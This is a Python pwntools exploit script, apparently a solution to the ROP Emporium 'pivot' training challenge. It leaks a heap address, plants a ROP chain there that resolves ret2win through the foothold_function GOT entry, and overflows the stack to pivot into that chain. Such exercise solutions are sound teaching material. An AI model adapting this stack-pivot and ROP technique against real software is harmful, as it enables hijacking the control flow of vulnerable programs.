from pwn import *

ret2win_offset = 0x0000000000000a81
foothold_offset = 0x000000000000096a
add_offset = ret2win_offset - foothold_offset
foothold_plt = 0x0000000000400720
foothold_got = 0x000000602048

xchg_rax = 0x00000000004009bd
pop_rax = 0x00000000004009bb
add_rax_rbp = 0x00000000004009c4
pop_rbp = 0x00000000004007c8
load_rax = 0x00000000004009c0
call_rax = 0x00000000004006b0

def exploit():
    p = process("./pivot")
    print(str(p.proc.pid))


    p.recvuntil(b"pivot: 0x")
    addr = int(p.recv(12), 16)
    log.info("address received: 0x%x" % addr)

    p.recvrepeat(0.2)
    # stack pivot in heap
    stack_pivot = p64(foothold_plt)
    stack_pivot += p64(pop_rax)
    stack_pivot += p64(foothold_got)
    stack_pivot += p64(load_rax)
    stack_pivot += p64(pop_rbp)
    stack_pivot += p64(add_offset)
    stack_pivot += p64(add_rax_rbp)
    stack_pivot += p64(call_rax)

    log.info("sending heap data for the stack pivot")
    p.sendline(stack_pivot)
    p.recvrepeat(0.2)

    log.info("sending first bof - stack pivoting")
    # stack overflow, return to stack pivot
    stack_chain = p64(pop_rax)
    stack_chain += p64(addr)
    stack_chain += p64(xchg_rax)
    p.sendline(b"A" * 40 + stack_chain)
    p.recvuntil(b"foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so")
    log.success( p.recvall())


if __name__ == "__main__":
    exploit()

